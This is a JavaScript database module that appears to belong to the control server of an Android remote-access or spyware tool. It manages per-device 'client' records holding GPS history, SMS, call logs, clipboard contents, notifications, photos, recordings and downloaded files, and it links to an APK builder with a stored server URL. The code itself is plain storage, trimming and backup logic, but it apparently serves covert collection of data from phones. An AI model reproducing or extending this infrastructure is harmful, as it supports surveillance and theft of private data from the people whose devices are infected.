// Database Module - Main Entry Point

import fs from 'fs/promises';
import fsSync from 'fs';
import path from 'path';
import low from 'lowdb';
import FileSync from 'lowdb/adapters/FileSync.js';
import config from '../config/config.js';
import { ensureDir } from '../utils/ensureDir.js';
import { asyncFs, paths, schemas } from './asyncdb.js';
import repository from './repository.js';
import { ExtendedMap } from '../utils/collections.js';
import { decompilePath, getBuiltApkPath } from '../builder/path.js';
import { dbPath, downloadsPath, photosPath, recordingsPath, clientsDir, backupsDir, mainDb, clientDb } from './path.js';
import { logger } from '../logs/logs.js';

const initDirs = () => {
    const dirs = [
        dbPath,
        downloadsPath,
        photosPath,
        recordingsPath,
        decompilePath,
        getBuiltApkPath(),
        clientsDir(),
        backupsDir()
    ];
    dirs.forEach(dir => ensureDir(dir));
    logger.info(`Directories initialized (${dirs.length})`, 'database');
};

initDirs();

const mainPath = mainDb();
const main = low(new FileSync(mainPath));

main.defaults({
    users: [],
    sessions: [],
    clients: [],
    settings: {
        serverStart: new Date().toISOString(),
        version: '2.3.3',
        maxClients: 500
    },
    build: {
        serverUrl: '',
        homePageUrl: '',
        lastBuild: null,
        buildCount: 0
    }
}).write();

logger.info('Main database initialized', 'database');

const clientDbs = new ExtendedMap();

const defaultSchema = (id) => schemas.client(id);

const getClient = (id) => {
    if (!id || typeof id !== 'string') return null;
    
    if (clientDbs.has(id)) {
        return clientDbs.get(id);
    }

    try {
        const file = clientDb(id);
        const db = low(new FileSync(file));
        db.defaults(defaultSchema(id)).write();
        db.set('lastUpdated', new Date().toISOString()).write();
        clientDbs.set(id, db);
        return db;
    } catch (e) {
        logger.systemError(`Failed to create client database: ${id}`, e);
        return null;
    }
};

const getClientIds = () => {
    try {
        const dir = clientsDir();
        if (!fsSync.existsSync(dir)) return [];
        return fsSync.readdirSync(dir)
            .filter(f => f.endsWith('.json'))
            .map(f => f.replace('.json', ''));
    } catch (e) {
        return [];
    }
};

const clientExists = (id) => {
    return fsSync.existsSync(clientDb(id));
};

const deleteClient = (id) => {
    try {
        main.get('clients').remove({ id }).write();
        const file = clientDb(id);
        if (fsSync.existsSync(file)) fsSync.unlinkSync(file);
        clientDbs.delete(id);
        cleanClientFiles(id);
        return true;
    } catch (e) {
        return false;
    }
};

const clearClientData = (id) => {
    try {
        const cdb = getClient(id);
        if (!cdb) return false;
        cdb.assign(defaultSchema(id)).write();
        return true;
    } catch (e) {
        return false;
    }
};

const cleanClientFiles = (id) => {
    try {
        [downloadsPath, photosPath, recordingsPath].forEach(dir => {
            if (fsSync.existsSync(dir)) {
                fsSync.readdirSync(dir)
                    .filter(f => f.startsWith(id))
                    .forEach(f => {
                        try { fsSync.unlinkSync(path.join(dir, f)); } catch (e) {}
                    });
            }
        });
    } catch (e) {}
};

const trimClientData = (id) => {
    try {
        const cdb = getClient(id);
        if (!cdb) return false;

        const { maxGpsHistory, maxNotifications, maxClipboardHistory, 
                maxDownloads, maxPhotos, maxRecordings, maxSmsHistory, maxCallsHistory } = config.limits;

        const trim = (key, max) => {
            const arr = cdb.get(key).value() || [];
            if (arr.length > max) {
                cdb.set(key, arr.slice(-max)).write();
            }
        };

        trim('gps', maxGpsHistory);
        trim('notifications', maxNotifications);
        trim('clipboard', maxClipboardHistory);
        trim('sms', maxSmsHistory);
        trim('calls', maxCallsHistory);

        [['downloads', maxDownloads, downloadsPath],
         ['photos', maxPhotos, photosPath],
         ['recordings', maxRecordings, recordingsPath]].forEach(([key, max, dir]) => {
            const arr = cdb.get(key).value() || [];
            if (arr.length > max) {
                arr.slice(0, arr.length - max).forEach(item => {
                    try {
                        const fp = path.join(dir, path.basename(item.file));
                        if (fsSync.existsSync(fp)) fsSync.unlinkSync(fp);
                    } catch (e) {}
                });
                cdb.set(key, arr.slice(-max)).write();
            }
        });

        return true;
    } catch (e) {
        return false;
    }
};

const getStats = () => {
    try {
        const clientIds = getClientIds();
        let totalSize = 0;
        let clientSize = 0;
        let downloadsSize = 0;
        let photosSize = 0;

        const mainFile = mainDb();
        if (fsSync.existsSync(mainFile)) totalSize += fsSync.statSync(mainFile).size;

        const logsFile = path.join(dbPath, 'logs.json');
        if (fsSync.existsSync(logsFile)) totalSize += fsSync.statSync(logsFile).size;

        clientIds.forEach(id => {
            const file = clientDb(id);
            if (fsSync.existsSync(file)) {
                const size = fsSync.statSync(file).size;
                totalSize += size;
                clientSize += size;
            }
        });

        if (fsSync.existsSync(downloadsPath)) {
            fsSync.readdirSync(downloadsPath).forEach(f => {
                try { downloadsSize += fsSync.statSync(path.join(downloadsPath, f)).size; } catch (e) {}
            });
        }

        if (fsSync.existsSync(photosPath)) {
            fsSync.readdirSync(photosPath).forEach(f => {
                try { photosSize += fsSync.statSync(path.join(photosPath, f)).size; } catch (e) {}
            });
        }

        return {
            clientCount: clientIds.length,
            dbSize: totalSize,
            clientDbSize: clientSize,
            downloadsSize,
            photosSize,
            totalSize: totalSize + downloadsSize + photosSize,
            cacheStats: {
                ...repository.getCacheStats(),
                clientDbsSize: clientDbs.size
            }
        };
    } catch (e) {
        return { error: e.message };
    }
};

const backup = (backupPath) => {
    try {
        const dir = backupPath || path.join(backupsDir(), `backup-${Date.now()}`);
        ensureDir(dir);

        ['main.json', 'logs.json'].forEach(f => {
            const src = path.join(dbPath, f);
            if (fsSync.existsSync(src)) fsSync.copyFileSync(src, path.join(dir, f));
        });

        const _clientsDir = clientsDir();
        const backupClientsDir = path.join(dir, 'clients');
        ensureDir(backupClientsDir);

        if (fsSync.existsSync(_clientsDir)) {
            fsSync.readdirSync(_clientsDir)
                .filter(f => f.endsWith('.json'))
                .forEach(f => fsSync.copyFileSync(path.join(_clientsDir, f), path.join(backupClientsDir, f)));
        }

        logger.info('Backup created', 'database');
        return { success: true, path: dir };
    } catch (e) {
        logger.systemError('Backup failed', e);
        return { success: false, error: e.message };
    }
};

const cleanupBackups = () => {
    try {
        const dir = backupsDir();
        if (!fsSync.existsSync(dir)) return;

        fsSync.readdirSync(dir)
            .filter(f => f.startsWith('backup-'))
            .sort()
            .reverse()
            .slice(10)
            .forEach(f => {
                try { fsSync.rmSync(path.join(dir, f), { recursive: true, force: true }); } catch (e) {}
            });
    } catch (e) {}
};

const getStatsAsync = async () => getStats();
const cleanupBackupsAsync = async () => cleanupBackups();
const trimClientDataAsync = async (id) => trimClientData(id);

const db = {
    main,
    getClient,
    getClientIds,
    clientExists,
    deleteClient,
    clearClientData,
    trimClientData,
    trimClientDataAsync,
    cleanClientFiles,
    getStats,
    getStatsAsync,
    backup,
    cleanupBackups,
    cleanupBackupsAsync,
    initDirs,
    repository,
    asyncFs,
    paths,
    schemas,
    clientDbs,
    defaultSchema
};

export default db;

export {
    main,
    getClient,
    getClientIds,
    clientExists,
    deleteClient,
    clearClientData,
    trimClientData,
    trimClientDataAsync,
    cleanClientFiles,
    getStats,
    getStatsAsync,
    backup,
    cleanupBackups,
    cleanupBackupsAsync,
    initDirs,
    repository,
    asyncFs,
    paths,
    schemas,
    clientDbs,
    defaultSchema
};
